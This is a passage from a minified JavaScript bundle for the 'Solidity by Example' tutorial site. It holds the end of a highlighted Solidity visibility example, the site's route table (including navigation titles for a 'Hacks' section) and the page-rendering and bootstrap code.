to call</span>\n    <span class="hljs-comment">// an external function here.</span>\n    <span class="hljs-comment">// function testExternalFunc() public pure returns (string memory) {</span>\n    <span class="hljs-comment">//     return externalFunc();</span>\n    <span class="hljs-comment">// }</span>\n\n    <span class="hljs-comment">// State variables</span>\n    <span class="hljs-keyword">string</span> <span class="hljs-keyword">private</span> privateVar = <span class="hljs-string">"my private variable"</span>;\n    <span class="hljs-keyword">string</span> <span class="hljs-keyword">internal</span> internalVar = <span class="hljs-string">"my internal variable"</span>;\n    <span class="hljs-keyword">string</span> <span class="hljs-keyword">public</span> publicVar = <span class="hljs-string">"my public variable"</span>;\n    <span class="hljs-comment">// State variables cannot be external so this code won&#x27;t compile.</span>\n    <span class="hljs-comment">// string external externalVar = "my external variable";</span>\n}\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Child</span> <span class="hljs-keyword">is</span> <span class="hljs-title">Base</span> </span>{\n    <span class="hljs-comment">// Inherited contracts do not have access to private functions</span>\n    <span class="hljs-comment">// and state variables.</span>\n    <span class="hljs-comment">// function testPrivateFunc() public pure returns (string memory) {</span>\n    <span class="hljs-comment">//     return privateFunc();</span>\n    <span class="hljs-comment">// }</span>\n\n    <span class="hljs-comment">// Internal function call be called inside child contracts.</span>\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">testInternalFunc</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">pure</span></span> <span class="hljs-title"><span class="hljs-keyword">override</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-keyword">memory</span></span>) </span>{\n        <span class="hljs-keyword">return</span> internalFunc();\n    }\n}\n</code></pre>\n'})},Is=n(13),Ts=n(18),Cs=n.n(Ts);var Ms=({type:s})=>{switch(s){case"breakingChanges":{const s="#fbbc04";return Object(j.jsx)("span",{className:Cs.a.component,style:{backgroundColor:s},children:"Breaking changes"})}case"newFeature":{const s="#ccff90";return Object(j.jsx)("span",{className:Cs.a.component,style:{backgroundColor:s},children:"New"})}default:throw new Error("invalid label type ".concat(s))}},Os=n(9),Ds=n.n(Os);const Ls=[{title:"",routes:[{path:"hello-world",title:"Hello World"},{path:"first-app",title:"First App"},{path:"primitives",title:"Primitive Data Types"},{path:"variables",title:"Variables"},{path:"state-variables",title:"Reading and Writing to a State Variable"},{path:"ether-units",title:"Ether and Wei"},{path:"gas",title:"Gas and Gas Price"},{path:"if-else",title:"If / Else"},{path:"loop",title:"For and While Loop"},{path:"mapping",title:"Mapping"},{path:"array",title:"Array"},{path:"enum",title:"Enum"},{path:"structs",title:"Structs"},{path:"data-locations",title:"Data Locations - Storage, Memory and Calldata"},{path:"function",title:"Function"},{path:"view-and-pure-functions",title:"View and Pure Functions"},{path:"error",title:"Error"},{path:"function-modifier",title:"Function Modifier"},{path:"events",title:"Events"},{path:"constructor",title:"Constructor"},{path:"inheritance",title:"Inheritance"},{path:"shadowing-inherited-state-variables",title:"Shadowing Inherited State Variables"},{path:"super",title:"Calling Parent Contracts"},{path:"visibility",title:"Visibility"},{path:"interface",title:"Interface"},{path:"payable",title:"Payable"},{path:"sending-ether",title:"Sending Ether - Transfer, Send, and Call"},{path:"fallback",title:"Fallback"},{path:"call",title:"Call"},{path:"delegatecall",title:"Delegatecall"},{path:"calling-contract",title:"Calling Other Contract"},{path:"new-contract",title:"Creating Contracts from a Contract"},{path:"try-catch",title:"Try / Catch"},{path:"import",title:"Import"},{path:"library",title:"Library"},{path:"hashing",title:"Hashing with Keccak256"},{path:"signature",title:"Verifying Signature"}]},{title:"Applications",routes:[{path:"multi-sig-wallet",title:"Multi Sig Wallet"},{path:"merkle-tree",title:"Merkle Tree"},{path:"iterable-mapping",title:"Iterable Mapping"},{path:"erc20",title:"ERC20"},{path:"create2",title:"Precompute Contract Address with Create2"},{path:"minimal-proxy",title:"Minimal Proxy Contract"},{path:"uni-directional-payment-channel",title:"Uni-directional Payment Channel"},{path:"bi-directional-payment-channel",title:"Bi-directional Payment Channel"}].map((s=>Object(Is.a)(Object(Is.a)({},s),{},{path:"/app/".concat(s.path)})))},{title:"Hacks",routes:[{path:"re-entrancy",title:"Re-Entrancy"},{path:"overflow",title:"Arithmetic Overflow and Underflow"},{path:"self-destruct",title:"Self Destruct"},{path:"accessing-private-data",title:"Accessing Private Data"},{path:"delegatecall",title:"Delegatecall"},{path:"randomness",title:"Source of Randomness"},{path:"denial-of-service",title:"Denial of Service"},{path:"phishing-with-tx-origin",title:"Phishing with tx.origin"},{path:"hiding-malicious-code-with-external-contract",title:"Hiding Malicious Code with External Contract"},{path:"honeypot",title:"Honeypot"},{path:"front-running",title:"Front Running"},{path:"block-timestamp-manipulation",title:"Block Timestamp Manipulation"},{path:"signature-replay",title:"Signature Replay"}].map((s=>Object(Is.a)(Object(Is.a)({},s),{},{path:"/hacks/".concat(s.path)})))}],Bs=["2021/01/24 - Minimal Proxy Contract","2021/01/01 - Updated to 0.7.6"];var Ps=[{path:"/app/bi-directional-payment-channel",component:x},{path:"/app/create2",component:S},{path:"/app/erc20",component:E},{path:"/app/iterable-mapping",component:A},{path:"/app/merkle-tree",component:I},{path:"/app/minimal-proxy",component:T},{path:"/app/multi-sig-wallet",component:C},{path:"/app/uni-directional-payment-channel",component:M},{path:"/array",component:O},{path:"/call",component:D},{path:"/calling-contract",component:L},{path:"/constructor",component:B},{path:"/data-locations",component:P},{path:"/delegatecall",component:F},{path:"/enum",component:q},{path:"/error",component:H},{path:"/ether-units",component:R},{path:"/events",component:X},{path:"/fallback",component:N},{path:"/first-app",component:W},{path:"/function",component:V},{path:"/function-modifier",component:U},{path:"/gas",component:z},{path:"/hacks/accessing-private-data",component:Y},{path:"/hacks/block-timestamp-manipulation",component:G},{path:"/hacks/delegatecall",component:K},{path:"/hacks/denial-of-service",component:Z},{path:"/hacks/front-running",component:J},{path:"/hacks/hiding-malicious-code-with-external-contract",component:Q},{path:"/hacks/honeypot",component:$},{path:"/hacks/overflow",component:ss},{path:"/hacks/phishing-with-tx-origin",component:as},{path:"/hacks/randomness",component:ns},{path:"/hacks/re-entrancy",component:ls},{path:"/hacks/self-destruct",component:es},{path:"/hacks/signature-replay",component:ps},{path:"/hashing",component:ts},{path:"/hello-world",component:cs},{path:"/if-else",component:rs},{path:"/import",component:os},{path:"/inheritance",component:is},{path:"/interface",component:hs},{path:"/library",component:js},{path:"/loop",component:ds},{path:"/mapping",component:us},{path:"/new-contract",component:ys},{path:"/payable",component:ms},{path:"/primitives",component:ws},{path:"/sending-ether",component:ks},{path:"/shadowing-inherited-state-variables",component:bs},{path:"/signature",component:fs},{path:"/state-variables",component:gs},{path:"/structs",component:_s},{path:"/super",component:vs},{path:"/try-catch",component:xs},{path:"/variables",component:Ss},{path:"/view-and-pure-functions",component:Es},{path:"/visibility",component:As},{path:"",component:function(){return Object(j.jsxs)("div",{className:Ds.a.component,children:[Object(j.jsx)(b,{title:"Solidity by Example | 0.7.6",description:"Learn smart contract programming using Solidity"}),Object(j.jsx)("h1",{className:Ds.a.header,children:Object(j.jsx)("a",{href:"/",children:"Solidity by Example"})}),Object(j.jsx)("div",{className:Ds.a.subHeader,children:"v 0.7.6"}),Object(j.jsxs)("div",{className:Ds.a.main,children:[Object(j.jsxs)("p",{children:["an introduction to"," ",Object(j.jsx)("a",{href:"https://solidity.readthedocs.io",children:"Solidity"})," with simple examples"]}),Object(j.jsx)("div",{className:Ds.a.updates,children:Bs.map(((s,a)=>Object(j.jsx)("div",{children:s},a)))}),Ls.map((({routes:s,title:a},n)=>Object(j.jsxs)("div",{children:[a&&Object(j.jsx)("h3",{children:a}),Object(j.jsx)("ul",{className:Ds.a.list,children:s.map((({path:s,title:a,breakingChanges:n,newFeature:l})=>Object(j.jsxs)("li",{className:Ds.a.listItem,children:[Object(j.jsx)("a",{href:s,children:a}),(n||l)&&Object(j.jsx)("div",{className:Ds.a.label,children:Object(j.jsx)(Ms,{type:n?"breakingChanges":"newFeature"})})]},s)))})]},n)))]})]})}}];var Fs=function(){return Object(j.jsx)(p.a,{basename:"",children:Object(j.jsxs)("div",{className:r.a.component,children:[Object(j.jsx)(d,{}),Object(j.jsx)("div",{className:r.a.main,children:Object(j.jsx)(t.c,{children:Ps.map((s=>Object(j.jsx)(t.a,{path:s.path,exact:!0,component:s.component},s.path)))})}),Object(j.jsx)("div",{className:r.a.footer,children:Object(j.jsx)(w,{})})]})})};Boolean("localhost"===window.location.hostname||"[::1]"===window.location.hostname||window.location.hostname.match(/^127(?:\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)){3}$/));const qs=document.getElementById("root");qs.hasChildNodes()?Object(e.hydrate)(Object(j.jsx)(Fs,{}),qs):Object(e.render)(Object(j.jsx)(Fs,{}),qs),"serviceWorker"in navigator&&navigator.serviceWorker.ready.then((s=>{s.unregister()})).catch((s=>{console.error(s.message)}))},8:function(s,a,n){s.exports={component:"Footer_component__2wm-B",row:"Footer_row__3cluQ",bar:"Footer_bar__93usQ",khan:"Footer_khan__3lTcL"}},9:function(s,a,n){s.exports={component:"pages_component__1bqIE",updates:"pages_updates__3xY-4",listItem:"pages_listItem__1RzOh",label:"pages_label__i9P1V",header:"pages_header__o5uPl"}}},[[39,1,2]]]);
//# sourceMappingURL=main.7645568c.chunk.js.map